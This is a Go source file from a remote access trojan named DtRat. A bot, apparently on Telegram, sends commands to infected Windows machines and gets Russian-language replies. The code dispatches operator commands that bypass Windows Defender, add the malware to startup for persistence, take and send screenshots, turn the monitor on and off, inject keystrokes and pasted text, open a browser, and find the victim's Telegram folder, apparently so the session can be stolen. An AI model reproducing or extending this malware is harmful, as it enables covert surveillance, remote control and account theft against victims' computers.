package rat

import (
	"dtrat/config"
	"dtrat/transport"
	"os"
)

func errToStatus(err error) string {
	if err == nil {
		return "Успешно"
	}

	return err.Error()
}

func (r *Rat) commandsSwitch(text string) {
	cmd, args := transport.ParseCommand(text)
	switch cmd {
	case "start":
		go r.startCmd()
	case "kill":
		go r.killCmd()
	case "help":
		go r.helpCmd()
	case "screenshot":
		go r.screenshotCmd()
	case "monitor":
		go r.monitorCmd(args)
	case "keyboard":
		go r.keyboardCmd(args)
	case "browser":
		go r.browserCmd(args)
	case "findtg":
		go r.findTgCmd()
	default:
		go r.defaultCmd()
	}
}

func (r *Rat) startCmd() {
	r.Bot.Send("Вас приветствует DtRat %s!\nвыполните /help чтобы узнать как использовать DtRat.\n\nНачата первоначальная инициализация.", config.Version)

	suc, total := r.Hider.BypassDefender()
	err := r.Hider.AddToStartup()

	doneTxt :=
		`
Инициализация завершена!
Добавление в автозапуск: %s
Обход Windows Defender: %d из %d команд успешно выполнены.
`

	r.Bot.Send(doneTxt, errToStatus(err), suc, total)
}

func (r *Rat) defaultCmd() {
	r.Bot.Send("Неизвестная команда, используйте /help что-бы получить спискок доступных команд и справку по их использованию")
}

func (r *Rat) helpCmd() {
	r.Bot.Send("%s", helpText)
}

func (r *Rat) killCmd() {
	r.Bot.Send("Остоновка процессов...")
	r.internalClose(nil)
}

func (r *Rat) screenshotCmd() {
	screenshot, err := r.Engine.System.Screenshot()
	defer os.Remove(screenshot)

	if err != nil {
		r.Bot.Send("Ошика: %v", err)
		return
	}

	r.Bot.SendFile(screenshot)
}

func (r *Rat) monitorCmd(args string) {
	if args != "on" && args != "off" {
		r.Bot.Send("Используйте /monitor [on|off]")
		return
	}

	var err error = nil
	switch args {
	case "on":
		err = r.Engine.System.MonitorState(true)
	case "off":
		err = r.Engine.System.MonitorState(false)
	}

	if err != nil {
		r.Bot.Send("Ошибка: %v", err)
		return
	}

	switch args {
	case "on":
		r.Bot.Send("Монитор включен.")
		return
	case "off":
		r.Bot.Send("Монитор выключен.")
		return
	}
}

func (r *Rat) keyboardCmd(args string) {
	cmd, arg := transport.ParseCommand(args)

	var err error
	switch cmd {
	case "press":
		err = r.Engine.System.PressKey(arg)
	case "paste":
		err = r.Engine.System.Paste(arg)
	case "hotkey":
		err = r.Engine.System.PressHotKey(arg)
	default:
		r.Bot.Send("Неизвестное действие: %s", cmd)
		return
	}

	if err != nil {
		r.Bot.Send("Ошибка: %v", err)
		return
	}

	r.Bot.Send("Успешно выполнено!")
}

func (r *Rat) browserCmd(args string) {
	err := r.Engine.Media.OpenBrowser(args)
	if err != nil {
		r.Bot.Send("Ошибка: %v", err)
		return
	}

	r.Bot.Send("Браузер успешно открыт.")
}

func (r *Rat) findTgCmd() {
	r.Bot.Send("Поиск папки Telegram... Это может занять некоторое время.")

	path, err := r.Engine.Info.FindTelegramDir()
	if err != nil {
		r.Bot.Send("Ошибка: %v", err)
		return
	}

	r.Bot.Send("Папка Telegram найдена: %s", path)
}
